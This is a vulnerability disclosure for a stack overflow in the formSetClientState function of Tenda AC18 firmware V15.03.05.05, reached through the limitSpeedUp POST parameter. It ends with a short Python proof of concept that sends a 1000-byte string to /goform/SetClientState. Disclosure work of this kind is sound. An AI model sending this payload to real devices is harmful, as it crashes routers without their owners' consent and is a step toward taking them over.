## Overview

- The device's official website: https://www.tenda.com.cn/product/overview/AC18.html

- Firmware download website: https://www.tenda.com.cn/download/detail-2610.html

## Affected version

V15.03.05.05

## Vulnerability details

The Tenda AC18 V15.03.05.05 firmware has a stack overflow vulnerability in the `formSetClientState` function. The `v10` variable receives the `limitSpeedUp` parameter from a POST request. The value is directly used in a `sprintf` function and passes to a local variable on the stack, which can override the return address of the function. The user-provided `limitSpeedUp` can trigger this security vulnerability.

![image-20240306000226211](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240306000226211.png)

![image-20240306000240089](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240306000240089.png)

![image-20240306000256998](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240306000256998.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/SetClientState"
payload = b"a"*1000

data = {'limitEn':1,"limitSpeedUp": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240305223636784](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240305223636784.png)
